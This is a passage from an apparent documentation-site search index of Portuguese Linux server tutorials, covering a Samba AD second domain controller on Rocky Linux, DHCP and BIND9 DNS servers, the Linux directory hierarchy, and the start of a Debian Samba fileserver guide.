tree \\\n    wget \\\n    which \\\n    xfsprogs-devel \\\n    yum-utils \\\n    zlib-devel \\\n    nano \\\n    krb5-workstation \\ \n\nyum clean all \n</code></pre></p> <p>Salvar o arquivo</p> <p>Transformar o arquivo em um execut\u00e1vel: <pre><code>chmod +x depende.sh\n</code></pre></p> <p>Executar o aquivo com o comando: <pre><code>./depende.sh\n</code></pre></p> <p>Fazer download da \u00faltima vers\u00e3o do samba com o comando: <pre><code>wget https://download.samba.org/pub/samba/stable/samba-4.18.0.tar.gz\n</code></pre></p> <p>Descompcatar o arquivo baixado com o comando: <pre><code>tar -zxvf samba-nome-arquivo\n</code></pre></p> <p>Mudar para o diret\u00f3rio onde foi descompactado: <pre><code>cd samba-nome-arquivo/\n</code></pre></p> <p>Compilar o samba para que o arquivo de configua\u00e7\u00e3o smb.conf ficar em:  /etc/samba/smb.conf: <pre><code>./configure --sysconfdir=/etc/samba/\n</code></pre></p> <p>Aguarde o procedimento terminar.</p> <p>Executar make e make install: <pre><code>make &amp;&amp; make install\n</code></pre></p> <p>Fazer com que o comando samba-tool possa ser chamado na ra\u00edz do sistema. No diret\u00f3rio /root editar o arquivo .bash_profile: <pre><code>nano .bash_profile\n</code></pre></p> <p>E inserir a linha: <pre><code># User specific environment and startup programs\nPATH=$PATH:$HOME/bin\n\n#ESTA LINHA:\nPATH=/usr/local/samba/bin/:/usr/local/samba/sbin/:$PATH\n\nexport PATH\n</code></pre></p> <p>Salvar o arquivo</p>"},{"location":"DC2_Rocky/#criar-um-arquivo-de-servico-systemd","title":"Criar um arquivo de servi\u00e7o systemd.","text":"<p>Executar os comandos: <pre><code># systemctl mask smbd nmbd winbind\n# systemctl disable smbd nmbd winbind\n</code></pre></p> <p>Criar o arquivo em <code>/etc/systemd/system/samba-ad-dc.service</code> <pre><code>nano /etc/systemd/system/samba-ad-dc.service\n</code></pre></p> <p>Com as seguintes linhas: <pre><code>[Unit]\nDescription=Samba Active Directory Domain Controller\nAfter=network.target remote-fs.target nss-lookup.target\n\n[Service]\nType=forking\nExecStart=/usr/local/samba/sbin/samba -D\nPIDFile=/usr/local/samba/var/run/samba.pid\nExecReload=/bin/kill -HUP $MAINPID\n\n[Install]\nWantedBy=multi-user.target\n</code></pre></p> <p>Salvar o arquivo</p> <p>Recarrregar o <code>systemd</code> com o comando: <pre><code>systemctl daemon-reload\n</code></pre></p> <p>Habilitar o <code>samba-ad-dc</code> para iniciar no boot do sistema: <pre><code>systemctl enable samba-ad-dc\n</code></pre></p> <p>Reestart o servi\u00e7o do samba-ad-dc com o comando: <pre><code>systemctl restart samba-ad-dc\n</code></pre></p> <p>Para parar servi\u00e7o fazer o comando: <pre><code>systemctl stop samba-ad-dc\n</code></pre></p> <p>Se necessitar desabilitar o servi\u00e7o, utilizar o comando: <pre><code>systemctl disable samba-ad-dc\n</code></pre></p>"},{"location":"DC2_Rocky/#configurar-o-firewall","title":"Configurar o Firewall","text":"<p>Adicionar servi\u00e7os: <pre><code>firewall-cmd --add-service={dns,ldap,ldaps,kerberos}\n</code></pre></p> <p>Adicionar portas: <pre><code>firewall-cmd --add-port={389/udp,135/tcp,135/udp,138/udp,138/tcp,137/tcp,137/udp,139/udp,139/tcp,445/tcp,445/udp,3268/udp,3268/tcp,3269/tcp,3269/udp,49152/tcp}\n</code></pre></p> <p>Recarregar o Firewall: <pre><code>firewall-cmd --reload\n</code></pre></p> <p>Copiar o arquivo krb5.conf para o diret\u00f3rio /etc: <pre><code>cp /usr/local/samba/private/krb5.conf /etc/krb5.conf\n</code></pre></p> <p>Executar o comando testparm para verifica\u00e7\u00e3o de erros de sintaxe: <pre><code>testparm\n</code></pre> A sa\u00edda do comando pode ser parecido com essa: <pre><code>Load smb config files from /etc/samba/smb.conf\nLoaded services file OK.\nWeak crypto is allowed\n\nServer role: ROLE_DOMAIN_MEMBER\n\nPress enter to see a dump of your service definitions\n</code></pre></p> <p>Reinciar o samba ad-dc <pre><code>smbcontrol all reload-config\n</code></pre></p> <p>Juntando-se ao Active Directory (DC1) a partir do (DC2)  = controlador de dominio 2. Substitua seu.dom\u00ednio para seus dados: <pre><code>samba-tool domain join seu.dominio DC -Uadministrator --realm=seu.dominio\n</code></pre> Com o comando acima o DC2 deve juntar-se ao DC1.</p> <p>THAT\u2019S ALL FOLKS!!</p>"},{"location":"DHCP_Server/","title":"\ud83d\udcc1 DHCP Server","text":""},{"location":"DHCP_Server/#criando-um-servidor-de-dhcp","title":"Criando um Servidor de DHCP","text":"<p>A INSTALA\u00c7\u00c3O A SEGUIR SE DAR\u00c1 NA M\u00c1QUINA DO PR\u00d3PRIO FIREWALL!</p>"},{"location":"DHCP_Server/#vamos-a-instalacao-do-pacote-do-dhcp-server","title":"Vamos a instala\u00e7\u00e3o do pacote do DHCP Server:","text":"<pre><code>apt-get install isc-dhcp-server\n</code></pre>"},{"location":"DHCP_Server/#agora-vamos-definir-a-interface-que-vai-escutar-o-servidor-de-dhcp-enp7s0","title":"Agora vamos definir a interface que vai escutar o servidor de DHCP (enp7s0):","text":"<pre><code>vim /etc/default/isc-dhcp-server\n</code></pre> <pre><code>INTERFACESv4=\u201denp7s0\u2033\n</code></pre>"},{"location":"DHCP_Server/#backup-do-arquivo-original","title":"Backup do arquivo original:","text":"<pre><code>mv /etc/dhcp/dhcpd.conf{,.orig}\n</code></pre>"},{"location":"DHCP_Server/#criacao-do-novo-arquivo","title":"Cria\u00e7\u00e3o do novo arquivo:","text":"<pre><code>vim /etc/dhcp/dhcpd.conf\n</code></pre> <pre><code># NOME DE DOM\u00cdNIO:\noption domain-name \"officinas.edu.\";\n\n# IP DO SERVIDOR DE DNS DA REDE (Separar por v\u00edrgula SEM espa\u00e7o):\noption domain-name-servers 192.168.70.254,1.1.1.1;\n\n# GATEWAY PADR\u00c3O:\noption routers 192.168.70.254;\n\n# DEFINI\u00c7\u00c3O DE HOR\u00c1RIO DA REDE (18000=BR):\noption time-offset -18000;\n\n# TEMPO DE RENOVA\u00c7\u00c3O DOS ENDERE\u00c7OS IPS POR INATIVIDADE (600=10MIN):\ndefault-lease-time 600;\n\n# TEMPO M\u00c1XIMO DE USO DE UM IP EM UMA M\u00c1QUINA DA REDE:\nmax-lease-time 7200;\n\n# DEFINE SE O DHCPD INSERE DIN\u00c2MICAMENTE UM NOVO REGISTRO DE M\u00c1QUINA NO DNS SERVER AO FORNECER UM IP:\nddns-update-style none;\n\n# INDICA QUE O SERVIDOR DE DHCP SER\u00c1 AUTORITATIVO SEMPRE:\nauthoritative;\n\n# GERENCIAMENTO DE LOGS:\nlog-facility local7;\n\n# RANGE DE GERENCIAMENTO DE IPS:\nsubnet 192.168.70.0 netmask 255.255.255.0 {\n    range 192.168.70.10 192.168.70.20;\n    option routers 192.168.70.254;\n}\n\n# IPS FIXOS POR MAC ADDRESS:\nhost vmwin10 {\n    hardware ethernet 52:54:00:C7:85:A9;\n    fixed-address 192.168.70.171;\n}\n\nhost PC_Gerente {\n    hardware ethernet 52:54:00:bf:17:be;\n    fixed-address 192.168.70.111;\n}\n</code></pre>"},{"location":"DHCP_Server/#agora-vamos-reiniciar-o-servico","title":"Agora vamos reiniciar o servi\u00e7o:","text":"<pre><code>systemctl restart isc-dhcp-server\n</code></pre>"},{"location":"DHCP_Server/#extra-para-trabalhar-com-multiplas-redes-adicionar-ao-etcdefaultisc-dhcp-server","title":"EXTRA: Para trabalhar com m\u00faltiplas redes, adicionar ao /etc/default/isc-dhcp-server:","text":"<pre><code>shared-network rede-almoxarifado {\n\n        subnet 172.16.254.0 netmask 255.255.255.0 {\n         range 172.16.254.20 172.16.254.100;\n         option routers 172.16.254.1;\n         option domain-name-servers 8.8.8.8, 8.8.4.4;\n         option broadcast-address 172.16.254.255;\n        }\n\n        # Sub-Rede adicional qual entrego apenas ips para os mac x e y:\n        subnet 10.0.0.240 netmask 255.255.255.240 {\n         option routers 10.0.0.241;\n         option domain-name-servers 8.8.8.8, 8.8.4.4;\n         option broadcast-address 10.0.0.255;\n\n         host pc1 {\n           hardware ethernet 70:71:BC:F1:9F:9E;\n           fixed-address 10.0.0.242;\n         }\n         host pc2 {\n           hardware ethernet 70:71:BC:F1:9F:1D;\n           fixed-address 10.0.0.243;\n         }\n\n         host cel1 {\n           hardware ethernet 08:00:27:18:DC:AA;\n           fixed-address 10.0.0.244;\n         }\n        }\n}\n</code></pre>"},{"location":"DHCP_Server/#instale-o-pacote-ieee-data-para-buscar-o-fabricante-dos-dispositivos-manufacturer-com-base-no-mac","title":"Instale o pacote ieee-data para buscar o fabricante dos dispositivos (manufacturer) com base no MAC:","text":"<pre><code>apt install ieee-data\n</code></pre>"},{"location":"DHCP_Server/#crie-os-aliases-dos-arquivos-para-os-diretorios-especifios","title":"Crie os aliases dos arquivos para os diret\u00f3rios espec\u00edfios:","text":"<pre><code>ln -s /usr/share/ieee-data/oui.txt /usr/share/misc/oui.txt\nln -s /usr/share/ieee-data/oui.txt /usr/local/etc/oui.txt\n</code></pre>"},{"location":"DHCP_Server/#imprime-as-concessoes-dhcp-ativas","title":"Imprime as concess\u00f5es DHCP ativas:","text":"<pre><code>dhcp-lease-list\n</code></pre> <pre><code>MAC                IP              hostname       valid until         manufacturer\n\n00:06:14:74:2a:5d  10.0.0.100     -NA-           2020-09-16 13:44:02       Furukawa\n</code></pre>"},{"location":"DHCP_Server/#para-uma-saida-legivel-por-maquina-com-datas-completas","title":"Para uma sa\u00edda leg\u00edvel por m\u00e1quina com datas completas:","text":"<pre><code>dhcp-lease-list --parsable\n</code></pre>"},{"location":"DHCP_Server/#imprime-o-ultimo-mac","title":"imprime o \u00faltimo MAC:","text":"<pre><code>dhcp-lease-list --last\n</code></pre>"},{"location":"DHCP_Server/#imprime-todas-as-entradas-ou-seja-mais-de-um-por-mac","title":"imprime todas as entradas, ou seja, mais de um por MAC:","text":"<pre><code>dhcp-lease-list --all\n</code></pre>"},{"location":"DHCP_Server/#validar-as-locacoes-dhcpd","title":"Validar as loca\u00e7\u00f5es dhcpd:","text":"<pre><code>cat /var/lib/dhcp/dhcpd.leases\n</code></pre> <pre><code>lease 10.0.0.100 {\n  starts 3 2020/09/16 14:06:33;\n  ends 3 2020/09/16 14:11:33;\n  cltt 3 2020/09/16 14:06:33;\n  binding state active;\n  next binding state free;\n  rewind binding state free;\n  hardware ethernet 00:06:14:74:2a:5d;\n}\n</code></pre> <p>that's all folks!</p>"},{"location":"DNS_Server/","title":"\ud83d\udcc1 DNS Server","text":""},{"location":"DNS_Server/#criando-um-servidor-de-dns","title":"Criando um Servidor de DNS","text":"<p>A INSTALA\u00c7\u00c3O A SEGUIR SE DAR\u00c1 NA M\u00c1QUINA DO PR\u00d3PRIO FIREWALL!</p>"},{"location":"DNS_Server/#instalar-os-pacotes-necessarios","title":"Instalar os pacotes necess\u00e1rios:","text":"<pre><code>apt-get install bind9 openssh-server dnsutils\n</code></pre>"},{"location":"DNS_Server/#editar-o-arquivo-etcdefaultnamed-e-deixa-lo-como-no-exemplo","title":"Editar o arquivo /etc/default/named e deixa-lo como no exemplo:","text":"<pre><code># run resolvconf?\nRESOLVCONF=no\n\n# startup options for the server\nOPTIONS=\"-u bind -4\"\n</code></pre>"},{"location":"DNS_Server/#o-arquivo-etcbindnamedconf-fica-sem-alteracao","title":"O arquivo /etc/bind/named.conf fica sem altera\u00e7\u00e3o:","text":"<pre><code>// This is the primary configuration file for the BIND DNS server named.\n//\n// Please read /usr/share/doc/bind9/README.Debian.gz for information on the \n// structure of BIND configuration files in Debian, *BEFORE* you customize \n// this configuration file.\n//\n// If you are just adding zones, please do that in /etc/bind/named.conf.local\n\ninclude \"/etc/bind/named.conf.options\";\ninclude \"/etc/bind/named.conf.local\";\ninclude \"/etc/bind/named.conf.default-zones\";\n</code></pre>"},{"location":"DNS_Server/#o-arquivo-etcbindnamedconflocal-tbem-fica-sem-alteracao","title":"O arquivo /etc/bind/named.conf.local tb\u00e9m fica sem altera\u00e7\u00e3o:","text":"<pre><code>//\n// Do any local configuration here\n//\n\n// Consider adding the 1918 zones here, if they are not used in your\n// organization\n//include \"/etc/bind/zones.rfc1918\";\n</code></pre>"},{"location":"DNS_Server/#entrar-em-etcbind","title":"Entrar em /etc/bind:","text":"<pre><code>cd /etc/bind\n</code></pre>"},{"location":"DNS_Server/#fazer-um-backup-do-arquivo-original","title":"Fazer um backup do arquivo original:","text":"<pre><code>cp named.conf.default-zones{,.orig}\n</code></pre>"},{"location":"DNS_Server/#editar-namedconfdefault-zones-e-deixa-lo-como-no-exemplo","title":"Editar named.conf.default-zones e deixa-lo como no exemplo:","text":"<pre><code>vim named.conf.default-zones\n</code></pre> <pre><code>// prime the server with knowledge of the root servers\nzone \".\" {\n    type hint;\n    file \"/usr/share/dns/root.hints\";\n};\n\n// be authoritative for the localhost forward and reverse zones, and for\n// broadcast zones as per RFC 1912\n\nzone \"localhost\" {\n    type master;\n    file \"/etc/bind/db.local\";\n};\n\nzone \"127.in-addr.arpa\" {\n    type master;\n    file \"/etc/bind/db.127\";\n};\n\nzone \"0.in-addr.arpa\" {\n    type master;\n    file \"/etc/bind/db.0\";\n};\n\nzone \"255.in-addr.arpa\" {\n    type master;\n    file \"/etc/bind/db.255\";\n};\n\nzone \"officinas.edu\" {\n      type master;\n      file \"/etc/bind/zones/db.officinas.edu\";\n};\n\nzone \"70.168.192.in-addr.arpa\" {\n    type master;\n    file \"/etc/bind/zones/db.70.168.192\";\n};\n</code></pre>"},{"location":"DNS_Server/#criar-editar-o-arquivo-namedconfoptions","title":"Criar/ editar o Arquivo named.conf.options:","text":"<pre><code>vim named.conf.options\n</code></pre> <pre><code>// CRIANDO REGRAS DE LIBERA\u00c7\u00c3O:\nacl interna {\n127.0.0.0/8;\n192.168.70.0/24;\n};\n\noptions {\n    directory \"/var/cache/bind\";\n\n    // CRIANDO RECURSIVIDADE DA MINHA ACL NA \u00c1RVORE HIER\u00c1RQUICA:\n    recursion yes;\n    allow-query { interna; };\n    allow-recursion { interna; };\n    listen-on port 53 { interna; };\n    allow-transfer { none; };\n    listen-on-v6 { none; };\n    version none;\n\n    // CRIANDO OS FORWARDERS:\n    forwarders {\n    // Cloudflare Public DNS IPV4\n    1.1.1.1;\n    1.0.0.1;\n    // Google Public DNS IPV4\n    8.8.8.8;\n    8.8.4.4;\n    };  \n\n    dnssec-validation auto;\n\n};\n</code></pre>"},{"location":"DNS_Server/#criar-a-pasta-zones-em-etcbind","title":"Criar a pasta zones em /etc/bind:","text":"<pre><code>mkdir -p /etc/bind/zones\n</code></pre>"},{"location":"DNS_Server/#entrar-na-pasta-zones","title":"Entrar na pasta zones:","text":"<pre><code>cd /etc/bind/zones\n</code></pre>"},{"location":"DNS_Server/#criar-editar-o-arquivo-de-zona-dbofficinasedu","title":"Criar/ editar o Arquivo de zona \"db.officinas.edu\":","text":"<pre><code>vim db.officinas.edu\n</code></pre> <pre><code>;\n; BIND zone file for officinas.edu\n;\n$TTL 86400\n@ IN SOA                          firewall.officinas.edu.  root.officinas.edu. (\n29032023                                                 ; Serial\n10800                                                    ; Refresh ( 3 hr )\n1800                                                     ; Retry ( 30 min )\n3600000                                                  ; Expire ( 41 dias )\n86400 )                                                  ; Negative Cache TTL (1 dia)\n;\n@                                 IN              NS      firewall.officinas.edu.\nfirewall.officinas.edu.           IN              A       192.168.70.254\ndcmaster.officinas.edu.           IN              A       192.168.70.200\nwebserver.officinas.edu.          IN              A       192.168.70.100\narquivos                          IN              CNAME   dcmaster.officinas.edu.\nwww                               IN              CNAME   webserver.officinas.edu.\n</code></pre>"},{"location":"DNS_Server/#atencao-explicacao-dos-campos-zona-e-zona-reversa","title":"ATEN\u00c7\u00c3O - Explica\u00e7\u00e3o dos Campos zona e zona reversa:","text":"<ul> <li>IN = Internet</li> <li>SOA = Start of Autority</li> <li>@ = Origem do Dominio e/ou Inicio da Configuracao</li> <li>TTL = Tempo de vida</li> <li>NS = Name Server</li> <li>MX = Mail Exchanger (10/20 numero de prioridade quanto maior o numero menor e a prioridade)</li> <li>hostmaster = email do administrador note que e separado por \".\" e NAO \"@\"</li> <li>A = Apontamento para IPv4 (Address Mapping)</li> <li>AAAA = Apontamento para IPv6 (Address Mapping)</li> <li>CNAME = Apontamento para Nome Canonico/alias</li> <li>PTR = PoinTeR (aponta dominio reverso a partir de um endere\u00e7o IP)</li> <li>TXT = TeXT, permite incluir um texto curto em um hostname. Tecnica usada para implementar o SPF.</li> <li>SPF = SenderPolicyFramework.Permite ao administrador de um dominio definir os enderecos das maquinas autorizadas a enviar mensagens neste dominio.</li> <li>SRV = SeRVice, permite definir localizacao de servicos disponiveis em um dominio, inclusive seus protocolos e portas.</li> </ul>"},{"location":"DNS_Server/#fazer-uma-copia-do-arquivo-db127-em-etcbind-para-etcbindzonesdb70168192","title":"Fazer uma copia do arquivo db.127 em /etc/bind para /etc/bind/zones/db.70.168.192:","text":"<pre><code>cp /etc/bind/db.127 /etc/bind/zones/db.70.168.192\n</code></pre>"},{"location":"DNS_Server/#criar-editar-o-arquivo-de-zona-reversa","title":"Criar/ editar o Arquivo de zona reversa:","text":"<pre><code>vim /etc/bind/zones/db.200.168.192\n</code></pre> <pre><code>;\n; BIND reverse data file for 70.168.192\n;\n$TTL    86400\n@       IN      SOA     firewall.officinas.edu. root.officinas.edu. (\n29032023                ; Serial\n10800                   ; Refresh ( 3 hr )\n1800                    ; Retry ( 30 min )\n3600000                 ; Expire ( 41 dias )\n86400 )                 ; Negative Cache TTL (1 dia)\n;\n@            IN      NS      firewall.officinas.edu.\nfirewall     IN      A       192.168.70.254\n254          IN      PTR     firewall.officinas.edu.\n200          IN      PTR     dcmaster.officinas.edu.\n100          IN      PTR     webserver.officinas.edu.\n</code></pre>"},{"location":"DNS_Server/#restart-reload-no-bind9-analisando-os-logs","title":"Restart/ reload no bind9 analisando os logs:","text":"<pre><code>/etc/init.d/bind9 restart ; tail -f /var/log/syslog\n</code></pre>"},{"location":"DNS_Server/#agora-vamos-entregar-a-resolucao-ao-dns-server-local-editando-o-etcresolvconf","title":"Agora, vamos entregar a resolu\u00e7\u00e3o ao DNS Server local editando o /etc/resolv.conf:","text":"<pre><code>vim /etc/resolv.conf\n</code></pre> <pre><code>127.0.0.1\n</code></pre>"},{"location":"DNS_Server/#checar-se-as-confs-foram-aplicadas","title":"Checar se as confs foram aplicadas:","text":"<pre><code>named-checkzone  officinas.edu /etc/bind/zones/db.officinas.edu\nnamed-checkzone  70.168.192 /etc/bind/zones/db.70.168.192\n</code></pre>"},{"location":"DNS_Server/#testar-o-dns-utilizando-o-comando-nslookup","title":"Testar o DNS utilizando o comando nslookup:","text":"<pre><code>nslookup www.terra.com.br\nnslookup www.proot.com.br\n</code></pre>"},{"location":"DNS_Server/#testar-o-dns-utilizando-o-dig","title":"Testar o DNS utilizando o dig:","text":"<pre><code>dig -t any www.terra.com.br\ndig -t any www.proot.com.br\n</code></pre>"},{"location":"DNS_Server/#bloqueia-a-edicao-do-arquivo-etcresolvconf","title":"Bloqueia a edi\u00e7\u00e3o do arquivo /etc/resolv.conf:","text":"<pre><code>chattr +i /etc/resolv.conf\n</code></pre> <p>that's all folks!</p>"},{"location":"FHS/","title":"\ud83d\udcc1 FHS Filesystem Hierarchy Standard","text":""},{"location":"FHS/#a-estrutura-hierarquica-de-diretorios-no-linux","title":"A estrutura Hier\u00e1rquica de Diret\u00f3rios no Linux","text":"<p>O sistema operacional Linux utiliza uma estrutura de diret\u00f3rios hier\u00e1rquica e organizada para gerenciar todos os arquivos e recursos do sistema. Compreender essa estrutura \u00e9 fundamental para usu\u00e1rios e administradores, pois fornece uma vis\u00e3o clara da organiza\u00e7\u00e3o do sistema de arquivos e onde encontrar ou armazenar diferentes tipos de dados.</p> <p>A hierarquia de diret\u00f3rios no Linux \u00e9 padronizada pelo Filesystem Hierarchy Standard (FHS), que define a fun\u00e7\u00e3o de cada diret\u00f3rio e estabelece conven\u00e7\u00f5es para a organiza\u00e7\u00e3o dos arquivos. Ao entender a finalidade de cada diret\u00f3rio, os usu\u00e1rios podem navegar no sistema com mais facilidade, armazenar dados nos locais apropriados e os administradores podem gerenciar o sistema de forma eficiente.</p> <p>Neste documento, exploraremos detalhadamente os principais diret\u00f3rios do sistema, desde o diret\u00f3rio raiz at\u00e9 os locais destinados a programas, configura\u00e7\u00f5es, arquivos tempor\u00e1rios e muito mais. Vamos examinar a fun\u00e7\u00e3o de cada diret\u00f3rio, os tipos de dados armazenados neles e como eles contribuem para o funcionamento adequado do sistema Linux.</p> <p>Vamos mergulhar na estrutura de diret\u00f3rios do Linux para entender melhor como o sistema organiza seus arquivos e recursos, proporcionando uma base s\u00f3lida para a utiliza\u00e7\u00e3o e administra\u00e7\u00e3o do sistema operacional:</p>"},{"location":"FHS/#_1","title":"<code>/</code>","text":"<ul> <li>O diret\u00f3rio raiz \u00e9 o ponto inicial do sistema de arquivos. Todos os outros diret\u00f3rios e arquivos s\u00e3o acess\u00edveis a partir daqui.</li> </ul>"},{"location":"FHS/#bin","title":"<code>/bin</code>","text":"<ul> <li>\u00c9 um <code>link simb\u00f3lico</code> apontando para <code>/usr/bin</code>, contendo os bin\u00e1rios essenciais do sistema. Estes incluem comandos b\u00e1sicos do sistema utilizados tanto por usu\u00e1rios regulares quanto por administradores.</li> </ul>"},{"location":"FHS/#boot","title":"<code>/boot</code>","text":"<ul> <li>Armazena os arquivos necess\u00e1rios para inicializa\u00e7\u00e3o do sistema, como o kernel, arquivos de configura\u00e7\u00e3o do bootloader e informa\u00e7\u00f5es relacionadas \u00e0 inicializa\u00e7\u00e3o.</li> </ul>"},{"location":"FHS/#dev","title":"<code>/dev</code>","text":"<ul> <li>Cont\u00e9m arquivos de dispositivo, que representam dispositivos f\u00edsicos ou virtuais no sistema. Cada hardware \u00e9 representado como um arquivo neste diret\u00f3rio.</li> </ul>"},{"location":"FHS/#etc","title":"<code>/etc</code>","text":"<ul> <li>\u00c9 o diret\u00f3rio onde os arquivos de configura\u00e7\u00e3o do sistema e dos aplicativos s\u00e3o armazenados. Isso inclui configura\u00e7\u00f5es de rede, informa\u00e7\u00f5es de usu\u00e1rios, configura\u00e7\u00f5es de servi\u00e7os e muito mais.</li> </ul>"},{"location":"FHS/#home","title":"<code>/home</code>","text":"<ul> <li>Cont\u00e9m os diret\u00f3rios pessoais dos usu\u00e1rios. Cada usu\u00e1rio normalmente possui um diret\u00f3rio correspondente aqui, onde podem armazenar seus arquivos pessoais.</li> </ul>"},{"location":"FHS/#lib-e-lib64","title":"<code>/lib</code> e <code>/lib64</code>","text":"<ul> <li>S\u00e3o <code>links simb\u00f3licos</code> apontando para <code>/usr/lib</code> e <code>/usr/lib64</code>, onde se armazenam as bibliotecas compartilhadas e m\u00f3dulos do kernel, necess\u00e1rias para os bin\u00e1rios localizados em <code>/usr/bin</code> e <code>/usr/sbin</code>. Enquanto o <code>/lib</code> \u00e9 usado para sistemas de 32 bits, o <code>/lib64</code> d\u00e1 suporte para sistemas de 64 bits.</li> </ul>"},{"location":"FHS/#media-e-mnt","title":"<code>/media</code> e <code>/mnt</code>","text":"<ul> <li>S\u00e3o diret\u00f3rios para montagem tempor\u00e1ria de dispositivos de armazenamento remov\u00edveis. O diret\u00f3rio <code>/media</code> \u00e9 geralmente utilizado para montagem autom\u00e1tica, enquanto <code>/mnt</code> \u00e9 comumente utilizado para montagens manuais.</li> </ul>"},{"location":"FHS/#opt","title":"<code>/opt</code>","text":"<ul> <li>\u00c9 utilizado para a instala\u00e7\u00e3o de pacotes de software adicionais que n\u00e3o s\u00e3o parte da distribui\u00e7\u00e3o principal. Os aplicativos instalados aqui t\u00eam suas pr\u00f3prias subpastas separadas.</li> </ul>"},{"location":"FHS/#proc-e-sys","title":"<code>/proc</code> e <code>/sys</code>","text":"<ul> <li>S\u00e3o sistemas de arquivos virtuais que fornecem informa\u00e7\u00f5es sobre processos, hardware e interfaces do kernel. O diret\u00f3rio <code>/proc</code> cont\u00e9m informa\u00e7\u00f5es em tempo real sobre o sistema, enquanto <code>/sys</code> \u00e9 usado para interagir com o kernel.</li> </ul>"},{"location":"FHS/#sbin","title":"<code>/sbin</code>","text":"<ul> <li>\u00c9 um <code>link simb\u00f3lico</code> apontando para <code>/usr/sbin</code>, armazenando bin\u00e1rios do sistema utilizados principalmente pelo superusu\u00e1rio (root) para realizar tarefas administrativas. Esses comandos geralmente n\u00e3o est\u00e3o dispon\u00edveis para usu\u00e1rios regulares.</li> </ul>"},{"location":"FHS/#tmp","title":"<code>/tmp</code>","text":"<ul> <li>\u00c9 um diret\u00f3rio destinado a arquivos tempor\u00e1rios. O conte\u00fado aqui \u00e9 frequentemente exclu\u00eddo entre as reinicializa\u00e7\u00f5es do sistema.</li> </ul>"},{"location":"FHS/#usr","title":"<code>/usr</code>","text":"<ul> <li>Uma hierarquia secund\u00e1ria, contendo a maioria dos programas, bibliotecas e documenta\u00e7\u00f5es do sistema. \u00c9 subdividido em <code>/usr/bin</code>, <code>/usr/sbin</code>, <code>/usr/lib</code>, entre outros, que cont\u00eam execut\u00e1veis, bin\u00e1rios de sistema, bibliotecas e outros recursos.</li> </ul>"},{"location":"FHS/#var","title":"<code>/var</code>","text":"<ul> <li>Armazena arquivos que podem variar de tamanho dinamicamente durante a opera\u00e7\u00e3o do sistema. Isso inclui logs, spools de impress\u00e3o, arquivos de cache e bancos de dados.</li> </ul>"},{"location":"FHS/#esta-e-uma-visao-mais-detalhada-da-estrutura-de-diretorios-no-linux-destacando-a-funcao-e-o-proposito-de-cada-diretorio-cada-um-desempenha-um-papel-vital-no-funcionamento-adequado-do-sistema-operacional","title":"Esta \u00e9 uma vis\u00e3o mais detalhada da estrutura de diret\u00f3rios no Linux, destacando a fun\u00e7\u00e3o e o prop\u00f3sito de cada diret\u00f3rio. Cada um desempenha um papel vital no funcionamento adequado do sistema operacional.","text":"<p>that's all folks!</p>"},{"location":"Fileserver_Debian/","title":"\ud83d\udcc1 FileServer no Debian com bin\u00e1rios","text":""},{"location":"Fileserver_Debian/#tutorial-de-configuracao-do-samba4-como-fileserver-no-debian-13","title":"Tutorial de Configura\u00e7\u00e3o do Samba4 como FileServer no Debian 13","text":""},{"location":"Fileserver_Debian/#este-guia-mostra-como-instalar-e-configurar-o-samba4-em-um-servidor-debian-13-criando-compartilhamentos-de-rede-com-permissoes-de-usuarios","title":"Este guia mostra como instalar e configurar o Samba4 em um servidor Debian 13, criando compartilhamentos de rede com permiss\u00f5es de usu\u00e1rios.","text":""},{"location":"Fileserver_Debian/#0-atualizar-o-sistema","title":"0 -  Atualizar o Sistema","text":"<pre><code>    sudo apt update &amp;&amp; sudo apt full-upgrade\n</code></pre>"},{"location":"Fileserver_Debian/#1-instalar-o-samba","title":"1 -  Instalar o Samba","text":"<pre><code>    sudo apt install samba -y\n</code></pre>"},{"location":"Fileserver_Debian/#2-adicione-ao-sistema-os-usuarios-que-terao-acesso-aos-diretorios-de-rede-sem-shell-e-sem-home","title":"2 - Adicione ao sistema os usu\u00e1rios que ter\u00e3o acesso aos diret\u00f3rios DE REDE (sem shell e sem home):","text":"<p><pre><code>    sudo useradd -s /bin/false -M kalel\n    sudo useradd -s /bin/false -M diana\n</code></pre> Para liberar um shell em caso de necessidade: \"sudo usermod -s /bin/bash kalel\" OU editar o \"/etc/passwd\"</p>"},{"location":"Fileserver_Debian/#3-criar-os-grupos-do-sistema-aos-quais-setaremos-permissao-de-acesso-aos-diretorios","title":"3 - Criar os grupos do sistema aos quais setaremos permiss\u00e3o de acesso aos diret\u00f3rios:","text":"<p><pre><code>    sudo groupadd gdiretoria\n</code></pre> <pre><code>    sudo groupadd gfinanceiro\n</code></pre></p> <p>Adicione os usu\u00e1rios aos grupos ao qual ter\u00e3o acesso:</p> <p><pre><code>    sudo usermod -aG gdiretoria kalel\n</code></pre> <pre><code>    sudo usermod -aG gfinanceiro diana\n</code></pre></p> <p>Adicione os usu\u00e1rios ao banco de senhas do Samba:</p> <pre><code>    sudo smbpasswd -a kalel\n    sudo smbpasswd -a diana\n</code></pre>"},{"location":"Fileserver_Debian/#4-criar-os-diretorios-para-os-compartilhamentos-de-rede","title":"4 -  Criar os diret\u00f3rios para os compartilhamentos de rede:","text":"<p><pre><code>    sudo mkdir -p /srv/samba/arquivos/diretoria\n</code></pre> <pre><code>    sudo mkdir -p /srv/samba/arquivos/financeiro\n</code></pre> <pre><code>    sudo mkdir -p /srv/samba/arquivos/publica\n</code></pre></p>"},{"location":"Fileserver_Debian/#5-definir-as-permissoes-das-pastas","title":"5 -  Definir as permiss\u00f5es das pastas:","text":"<p>A flag 2 \u2192 setgid: faz com que novos arquivos/subdiret\u00f3rios criados dentro, herdem as permiss\u00f5es do grupo \u00e1 que perten\u00e7a o diret\u00f3rio principal.</p> <p><pre><code>    sudo chmod 2770 -R /srv/samba/arquivos/diretoria\n</code></pre> <pre><code>    sudo chmod 2770 -R /srv/samba/arquivos/financeiro\n</code></pre> <pre><code>    sudo chmod 2775 -R /srv/samba/arquivos/publica\n</code></pre></p> <pre><code>    sudo chown -R root:gdiretoria /srv/samba/arquivos/diretoria\n</code></pre> <pre><code>   sudo chown -R root:gfinanceiro /srv/samba/arquivos/financeiro\n</code></pre> <pre><code>sudo chown -R nobody:nogroup /srv/samba/arquivos/publica\n</code></pre>"},{"location":"Fileserver_Debian/#6-antes-de-editar-faca-backup-do-arquivo-principal-do-samba","title":"6 - Antes de editar, fa\u00e7a backup do arquivo principal do Samba:","text":"<pre><code>    sudo mv /etc/samba/smb.conf{,.orig}\n</code></pre>"},{"location":"Fileserver_Debian/#7-crie-o-arquivo-de-configuracao-do-samba","title":"7 - Crie o arquivo de configura\u00e7\u00e3o do Samba:","text":"<pre><code>   